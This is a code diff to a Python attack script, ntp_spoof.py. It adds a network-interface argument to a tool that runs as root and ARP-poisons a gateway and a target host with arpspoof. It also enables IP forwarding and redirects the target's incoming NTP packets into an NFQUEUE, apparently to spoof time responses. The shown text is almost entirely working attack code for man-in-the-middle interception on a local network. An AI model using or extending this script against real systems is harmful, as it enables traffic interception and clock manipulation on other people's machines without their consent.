@@ -125,13 +125,14 @@ def main():  # no arguments
     if os.geteuid() != 0:
         print('You have to run the script as root')
         exit(1)
-    elif len(sys.argv) < 2:
-        print('Usage:python3 ntp_spoof.py <gateway IP Address> <target IP Address>')
-        print('Example:python3 ntp_spoof.py 192.168.0.1 192.168.0.99')
+    elif len(sys.argv) < 3:
+        print('Usage:python3 ntp_spoof.py <gateway IP Address> <target IP Address> <interface>')
+        print('Example:python3 ntp_spoof.py 192.168.0.1 192.168.0.99 eth0')
         exit(1)
-    elif len(sys.argv) > 3:
+    elif len(sys.argv) > 4:
         print("Too many arguments")
-        print('Usage:python3 ntp_spoof.py <gateway IP Address> <target IP Address>')
+        print('Usage:python3 ntp_spoof.py <gateway IP Address> <target IP Address> <interface>')
+        print('Example:python3 ntp_spoof.py 192.168.0.1 192.168.0.99 eth0')
         exit(1)
 
     '''
@@ -153,11 +154,15 @@ def main():  # no arguments
 
     gateway = sys.argv[1]
     vict = sys.argv[2]
+    if len(sys.argv) <= 3:
+        interface = 'eth0'
+    else:
+        interface = sys.argv[3]
     # package_installation()
     os.system(" echo 1 > /proc/sys/net/ipv4/ip_forward")
     os.system('iptables -F -vt raw')  # flush existing IP tables
-    p = Popen(['arpspoof', '-t', gateway, vict], stderr=DEVNULL, stdout=DEVNULL)
-    q = Popen(['arpspoof', '-t', vict, gateway], stderr=DEVNULL, stdout=DEVNULL)
+    p = Popen(['arpspoof', '-i', interface, '-t', gateway, vict], stderr=DEVNULL, stdout=DEVNULL)
+    q = Popen(['arpspoof', '-i', interface, '-t', vict, gateway], stderr=DEVNULL, stdout=DEVNULL)
     os.system('iptables -t raw -A PREROUTING -p udp -d ' + vict + ' --sport 123 -j NFQUEUE --queue-num 99')
     """
     -t : tables; we use raw: for nfqueue types - prerouting (for packets arriving from any network interface) and output
